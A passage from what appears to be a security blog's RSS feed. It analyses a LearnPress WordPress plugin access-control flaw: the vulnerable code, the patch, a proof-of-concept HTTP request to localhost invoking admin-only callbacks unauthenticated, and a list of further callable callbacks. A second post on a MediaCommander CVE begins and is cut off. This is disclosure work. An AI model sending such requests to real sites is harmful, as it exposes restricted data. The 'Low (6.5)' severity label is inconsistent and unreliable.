{&#xA;    LoadContentViaAjax::catch_lp_ajax();&#xA;    LessonAjax::catch_lp_ajax();&#xA;    EditCurriculumAjax::catch_lp_ajax();&#xA;    EditQuizAjax::catch_lp_ajax();&#xA;    EditQuestionAjax::catch_lp_ajax();&#xA;    SendEmailAjax::catch_lp_ajax();&#xA;    OpenAiAjax::catch_lp_ajax();&#xA;&#xA;    do_action( &amp;#39;learn-press/register-ajax-handlers&amp;#39; );&#xA;  },&#xA;  11&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;init&lt;/code&gt; hook is an early initialization hook in WordPress, which runs after WordPress has finished loading core components but before sending output to the browser =&amp;gt; Any request from any user can trigger it.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;function () {}&lt;/code&gt; is an anonymous function set as the callback for this hook.&lt;/p&gt;&#xA;&lt;p&gt;On line 4, the static function &lt;code&gt;LoadContentViaAjax:catch_lp_ajax()&lt;/code&gt; is called from the &lt;code&gt;LoadContentViaAjax&lt;/code&gt; class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax { ... }&#xA;&#xA;abstract class AbstractAjax {&#xA;  public static function catch_lp_ajax() {&#xA;    if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) ) {&#xA;      $action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&#xA;      $nonce  = $_REQUEST[&amp;#39;nonce&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;      $class  = new static();&#xA;&#xA;      // For case cache html, so cache nonce is not required.&#xA;      $class_no_nonce = [&#xA;        LoadContentViaAjax::class,&#xA;      ];&#xA;&#xA;      if ( ! wp_verify_nonce( $nonce, &amp;#39;wp_rest&amp;#39; ) ) {&#xA;        if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {&#xA;          wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;        } else {&#xA;          // Allow to handle without nonce, but must same domain.&#xA;          $referer = wp_get_referer();&#xA;          if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {&#xA;            wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;          }&#xA;        }&#xA;      }&#xA;&#xA;      if ( is_callable( [ $class, $action ] ) ) {&#xA;        call_user_func( [ $class, $action ] );&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Inherited Class&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;LoadContentViaAjax&lt;/code&gt; inherits all AJAX processing logic from &lt;code&gt;AbstractAjax&lt;/code&gt;.&#xA;2. **Hook &lt;code&gt;init&lt;/code&gt; calls &lt;code&gt;catch_lp_ajax()**&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;When WordPress reaches the &lt;code&gt;init&lt;/code&gt; hook&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;LoadContentViaAjax::catch_lp_ajax()&lt;/code&gt; is executed.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request Check&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Only processes when the request has the &lt;code&gt;lp-load-ajax&lt;/code&gt; parameter.&#xA;4. &lt;strong&gt;Action Determination&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ This value is treated as the &lt;strong&gt;method name&lt;/strong&gt; to be called in the child class.&#xA;5. &lt;strong&gt;Object Initialization&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class = new static();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;static&lt;/code&gt; refers to the class currently being called (&lt;code&gt;LoadContentViaAjax&lt;/code&gt;), so it creates an instance of that class.&#xA;6. &lt;strong&gt;Nonce Handling&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieves &lt;code&gt;nonce&lt;/code&gt; from the request&lt;/li&gt;&#xA;&lt;li&gt;Checks it using &lt;code&gt;wp_verify_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Specifically, &lt;code&gt;LoadContentViaAjax&lt;/code&gt; is allowed to &lt;strong&gt;bypass the nonce&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;When bypassing the nonce, it checks if the &lt;code&gt;referer&lt;/code&gt; is from the same domain.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Call Corresponding Method&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $action ] ) ) {&#xA;    call_user_func( [ $class, $action ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ If &lt;code&gt;LoadContentViaAjax&lt;/code&gt; has a method with the same name as the &lt;code&gt;lp-load-ajax&lt;/code&gt; value&#xA;→ That method will be called and executed.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax {&#xA;  public function load_content_via_ajax() {&#xA;    $response = new LP_REST_Response();&#xA;&#xA;    try {&#xA;      $params = wp_unslash( $_REQUEST[&amp;#39;data&amp;#39;] ?? &amp;#39;&amp;#39; );&#xA;      if ( empty( $params ) ) {&#xA;        throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      $params = LP_Helper::json_decode( $params, true );&#xA;&#xA;      if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;        ! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      // @var array $args&#xA;      $args     = $params[&amp;#39;args&amp;#39;];&#xA;      $callBack = $params[&amp;#39;callback&amp;#39;];&#xA;&#xA;      if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;        empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      $class  = $callBack[&amp;#39;class&amp;#39;];&#xA;      $method = $callBack[&amp;#39;method&amp;#39;];&#xA;&#xA;      // Security: check callback is registered.&#xA;      $allow_callbacks = apply_filters(&#xA;        &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;        []&#xA;      );&#xA;      $callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;      if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;        throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;      }&#xA;&#xA;      // Check class and method is callable.&#xA;      if ( is_callable( [ $class, $method ] ) ) {&#xA;        $data = call_user_func( [ $class, $method ], $args );&#xA;      } else {&#xA;        throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;      }&#xA;&#xA;      if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;        throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      $response-&amp;gt;message = $data-&amp;gt;message ?? &amp;#39;&amp;#39;;&#xA;      unset( $data-&amp;gt;message );&#xA;&#xA;      $response-&amp;gt;status = &amp;#39;success&amp;#39;;&#xA;      $response-&amp;gt;data   = $data;&#xA;    } catch ( Throwable $e ) {&#xA;      $response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;      $response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;    }&#xA;&#xA;    wp_send_json( $response );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The necessary variables for &lt;code&gt;call_user_func&lt;/code&gt; are formed directly from this code snippet and linked together according to the processing flow:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = LP_Helper::json_decode( $params, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;$params&lt;/code&gt; variable is the input data array after decoding JSON from the request, which must contain callback information and parameters.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args     = $params[&amp;#39;args&amp;#39;];&#xA;$callBack = $params[&amp;#39;callback&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt; contains the parameters to be passed to the called function, while &lt;code&gt;$callBack&lt;/code&gt; describes the callback to be executed.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;$method = $callBack[&amp;#39;method&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These two variables exactly identify the &lt;strong&gt;class&lt;/strong&gt; and &lt;strong&gt;method&lt;/strong&gt; to be called dynamically.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callBackStr = $class . &amp;#39;:&amp;#39; . $method;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This string is used to verify against the list of allowed callbacks in &lt;code&gt;$allow_callbacks&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;A series of callbacks are registered for the &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; filter via the &lt;code&gt;add_filter&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives the existing &lt;code&gt;$callbacks&lt;/code&gt; array, then appends two strings in the format &lt;code&gt;ClassName:method&lt;/code&gt; for the current class, and returns the array for WordPress to use as a list of valid callbacks. When debugging, we can see all registered callbacks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $method ] ) ) {&#xA;    $data = call_user_func( [ $class, $method ], $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The array &lt;code&gt;[ $class, $method ]&lt;/code&gt; is precisely the valid callback required by &lt;code&gt;call_user_func&lt;/code&gt;. When the &lt;code&gt;is_callable&lt;/code&gt; condition is true, WordPress calls the &lt;code&gt;$method&lt;/code&gt; of class &lt;code&gt;$class&lt;/code&gt; and passes the &lt;code&gt;$args&lt;/code&gt; variable as the sole parameter to that method.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability arises because the API does not perform any capability/permission checks.&lt;/strong&gt; This allows any user – including those without administrative privileges – to call the endpoint and request the execution of any callback in the valid callback list, even if those callbacks should be restricted to admins.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The patch (v4.3.2)&lt;/strong&gt; adds a permission validation step to the &lt;code&gt;load_content_via_ajax&lt;/code&gt; function by hardcoding the list of allowed callbacks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allow_callbacks = apply_filters(&#xA;    &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;    [&#xA;        &amp;#39;LP_Admin_Dashboard:order_statistic&amp;#39;,&#xA;        &amp;#39;LP_Admin_Dashboard:plugin_status_content&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Only callbacks whose class and method names exactly match &lt;code&gt;&#39;LP_Admin_Dashboard:order_statistic&#39;&lt;/code&gt; or &lt;code&gt;&#39;LP_Admin_Dashboard:plugin_status_content&#39;&lt;/code&gt; will pass the check.&lt;/p&gt;&#xA;&lt;p&gt;Both &lt;code&gt;order_statistic&lt;/code&gt; and &lt;code&gt;plugin_status_content&lt;/code&gt; functions have a mechanism to check for Administrator privileges before execution:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {&#xA;  wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;learnpress&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As a result, the vulnerability is fully secured.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send request with lp-load-ajax parameter&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;LoadContentViaAjax::catch_lp_ajax() triggered via init hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Check lp-load-ajax parameter exists&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Create instance of LoadContentViaAjax&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Class in $class_no_nonce whitelist → Skip nonce check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Retrieve $class and $method from request data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check if $class:$method is in $allow_callbacks (all callbacks allowed)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;is_callable([class, method])?&amp;#34;]&#xA;I --&amp;gt;|Yes| J[&amp;#34;Execute callback via call_user_func([class, method], args)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Sensitive admin-only data returned to attacker&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request with an Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1&#xA;Host: localhost&#xA;Referer: http://localhost&#xA;&#xA;lp-load-ajax=load_content_via_ajax&amp;amp;data={&amp;#34;callback&amp;#34;:{&amp;#34;class&amp;#34;:&amp;#34;LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;render_list_items_not_assign&amp;#34;},&amp;#34;args&amp;#34;:{&amp;#34;quiz_id&amp;#34;:483}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Other valid callback lists:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Broken Access Control&lt;/strong&gt; vulnerability in LearnPress &amp;lt;= 4.3.1 allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to execute AJAX callbacks that were intended only for admins. The issue occurs because the API does not check &lt;strong&gt;capability/permission&lt;/strong&gt; before calling &lt;code&gt;call_user_func([class, method], args)&lt;/code&gt;. Patch 4.3.2 has limited the valid callbacks and requires Administrator privileges, preventing unauthorized access.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never allow dynamic callbacks to execute without checking permissions.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;lp-load-ajax&lt;/code&gt; endpoint can become a vulnerability if the callback list is not restricted.&lt;/li&gt;&#xA;&lt;li&gt;Always validate &lt;code&gt;nonce&lt;/code&gt; or check &lt;strong&gt;referer/domain&lt;/strong&gt; to reduce risks from invalid requests.&lt;/li&gt;&#xA;&lt;li&gt;Patches should &lt;strong&gt;hardcode the callback list&lt;/strong&gt; and combine it with admin privilege checks for sensitive functions.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control often occurs in AJAX/REST APIs when developers trust input data from the client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;</description>
    </item>
    <item>
      <title>CVE-2025-14508 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-15-cve-2025-14508/</link>
      <pubDate>Mon, 15 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-15-cve-2025-14508/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The MediaCommander – Bring Folders to Media, Posts, and Pages&lt;/strong&gt; for WordPress has an &lt;strong&gt;unauthorized data deletion&lt;/strong&gt; vulnerability due to &lt;strong&gt;missing capability check&lt;/strong&gt; at the &lt;strong&gt;REST API endpoint &lt;code&gt;import-csv&lt;/code&gt;&lt;/strong&gt; in all versions &lt;strong&gt;≤ 2.3.1&lt;/strong&gt;.&#xA;The root cause is that this endpoint only checks for &lt;strong&gt;&lt;code&gt;upload_files&lt;/code&gt;&lt;/strong&gt; capability (&lt;strong&gt;Author level&lt;/strong&gt;) for a &lt;strong&gt;destructive action&lt;/strong&gt; that can &lt;strong&gt;delete all folders&lt;/strong&gt;.&#xA;This allows &lt;strong&gt;an authenticated attacker&lt;/strong&gt;, with &lt;strong&gt;Author or higher privileges&lt;/strong&gt;, to &lt;strong&gt;delete all folder organization data&lt;/strong&gt; created by &lt;strong&gt;Administrators&lt;/strong&gt; and &lt;strong&gt;other users&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-14508&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-14508&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mediacommander/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander – Bring Folders 